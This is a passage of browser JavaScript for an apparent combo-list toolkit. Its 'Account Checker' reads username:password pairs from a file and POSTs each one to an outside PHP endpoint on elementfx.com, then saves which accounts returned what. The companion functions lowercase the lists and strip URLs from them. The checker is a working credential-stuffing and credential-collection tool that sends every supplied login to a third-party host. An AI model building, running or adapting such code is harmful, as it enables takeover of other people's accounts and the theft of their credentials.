// Show the corresponding tool section
function showTool(tool) {
  document.getElementById("menu").style.display = 'none';
  document.querySelectorAll(".tool-section").forEach(section => section.classList.add("hidden"));
  document.getElementById(tool).classList.remove("hidden");
}

// Go back to the main menu
function goBack() {
  document.querySelectorAll(".tool-section").forEach(section => section.classList.add("hidden"));
  document.getElementById("menu").style.display = 'block';
}

// Account Checker
async function processAccounts() {
  const fileInput = document.getElementById("checkerFile");
  const resultContainer = document.getElementById("checkerResult");

  if (!fileInput.files[0]) {
    resultContainer.textContent = "Please select a file first.";
    return;
  }

  const file = fileInput.files[0];
  const text = await file.text();
  const accounts = text.split("\n").filter(Boolean);

  resultContainer.innerHTML = "Checking accounts...";
  const startTime = Date.now();
  const results = [];

  for (const account of accounts) {
    const [uu, pp] = account.split(":").map(item => item.trim());
    try {
      const response = await fetch("https://www.jarelldanegods.elementfx.com/hat.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ uu, pp })
      });
      const result = await response.text();
      results.push(`${uu}: ${result}`);
    } catch (error) {
      results.push(`${uu}: Error`);
    }
  }

  const timeTaken = ((Date.now() - startTime) / 1000).toFixed(2);
  const outputFile = `checked-accounts-${Date.now()}.txt`;
  saveToFile(outputFile, results.join("\n"));

  resultContainer.innerHTML = `
    <pre>
Time Taken: ${timeTaken} seconds
Accounts Processed: ${accounts.length}
File Saved: ${outputFile}
    </pre>
  `;
}

// URL Remover
async function removeUrls() {
  const fileInput = document.getElementById("urlFile");
  const resultContainer = document.getElementById("urlResult");

  if (!fileInput.files[0]) {
    resultContainer.textContent = "Please select a file first.";
    return;
  }

  const file = fileInput.files[0];
  const text = await file.text();
  const cleanedText = text.replace(/https?:\/\/\S+/g, "");
  const outputFile = `urls-removed-${Date.now()}.txt`;
  saveToFile(outputFile, cleanedText);

  resultContainer.innerHTML = `
    <pre>
Text Processed: ${text.split("\n").length}
File Saved: ${outputFile}
    </pre>
  `;
}

// Account Formatter
async function formatAccounts() {
  const fileInput = document.getElementById("formatterFile");
  const resultContainer = document.getElementById("formatterResult");

  if (!fileInput.files[0]) {
    resultContainer.textContent = "Please select a file first.";
    return;
  }

  const file = fileInput.files[0];
  const text = await file.text();
  const formattedText = text.split("\n").map(line => line.trim().toLowerCase()).join("\n");
  const outputFile = `formatted-accounts-${Date.now()}.txt`;
  saveToFile(outputFile, formattedText);

  resultContainer.innerHTML = `
    <pre>
Text Processed: ${text.split("\n").length}
File Saved: ${outputFile}
    </pre>
  `;
}

// Save text data as a downloadable file
function saveToFile(filename, data) {
  const blob =
